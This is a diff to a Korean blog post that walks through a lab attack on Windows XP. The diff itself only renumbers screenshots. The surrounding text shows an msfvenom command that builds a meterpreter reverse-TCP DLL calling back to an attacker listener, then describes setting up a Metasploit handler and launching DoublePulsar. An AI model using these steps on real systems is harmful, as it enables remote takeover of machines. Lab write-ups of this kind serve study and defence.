@@ -88,15 +88,16 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.254.129 lport=4444 -f 
 명령어를 입력해서 악성 dll을 생성한다.  
 그리고 그걸 공격하던 xp로 가져온다.  
 
-![7](assets/postimage/Fuzz7.png)
+![8](assets/postimage/Fuzz8.png)
 
 핸들러 하나 설정해준다. 위 dll악성코드와 동일한설정으로 한다.  
 
-![8](assets/postimage/Fuzz8.png)
+![9](assets/postimage/Fuzz9.png)
+
 
 그리고 메타스플로잇으로 방금만든 핸들러를 실행시켜준다  
 
-![9](assets/postimage/Fuzz9.png)
+![7](assets/postimage/Fuzz7.png)
 
 다시 공격하던 XP로 돌아가서 use Doublepulsar 명령어를 입력해서 더블풀자를 실행한다. 
 
